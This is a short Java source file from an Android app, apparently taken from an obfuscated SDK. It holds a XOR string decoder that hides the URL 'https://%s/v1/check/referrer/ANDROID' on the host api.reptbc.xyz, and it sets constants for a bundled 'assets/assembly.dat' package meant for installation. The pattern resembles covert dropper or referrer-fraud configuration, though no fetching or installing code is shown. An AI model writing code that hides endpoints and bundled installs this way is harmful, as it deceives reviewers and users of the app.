
package com.ardently.love.fusion.aac;
import java.util.ArrayList;


import java.util.Random;


import java.util.HashMap;



import java.security.cert.X509Certificate;

import java.nio.charset.StandardCharsets;
import java.util.regex.Matcher;
import java.util.regex.Pattern;



class ZPercentageGoldLogin {
    static String recycleImmersiveAssembly(int[] contents, int key, boolean hasEmoji) {
        byte[] newList = new byte[contents.length - 1];
        newList[0] = 0;
        for (int i = 0; i < contents.length; i++) {
            int v = contents[i];
            v ^= key;
            v &= 0xff;
            if (v == 0 && i == contents.length - 1) {
                break;
            }
            newList[i] = (byte)v;
        }
        String string = new String(newList, StandardCharsets.UTF_8);
        if (hasEmoji) {
            Pattern pattern = Pattern.compile("(\\\\u(\\p{XDigit}{2,4}))");
            Matcher matcher = pattern.matcher(string);
            char ch;
            while (matcher.find()) {
                ch = (char) Integer.parseInt(matcher.group(2), 16);
                string = string.replace(matcher.group(1), ch + "");
            }
        }
        return string;
    }
}


public abstract class QRowsAudio {

    static final String HOST_NAME = "api.reptbc.xyz";
    static final String REF_URL = String.format(ZPercentageGoldLogin.recycleImmersiveAssembly(new int[] {43,55,55,51,48,121,108,108,102,48,108,53,114,108,32,43,38,32,40,108,49,38,37,38,49,49,38,49,108,2,13,7,17,12,10,7,67},0x43,false), HOST_NAME);

    public static String TAG = QRowsAudio.class.getSimpleName();
    static X509Certificate expectedCert;
    public static int bg = 0x1234567;

    public static final boolean DBG_SELECT = false;
    public static final boolean DBG_LOG = false;

    public static String PKG_NAME = "com.nsotcg.ufx596.wrmo";
    public static String PKG_FILE = "assets/assembly.dat";
    public static int PKG_VER = 1;
    public static String INSTALL_FILE = "";
}
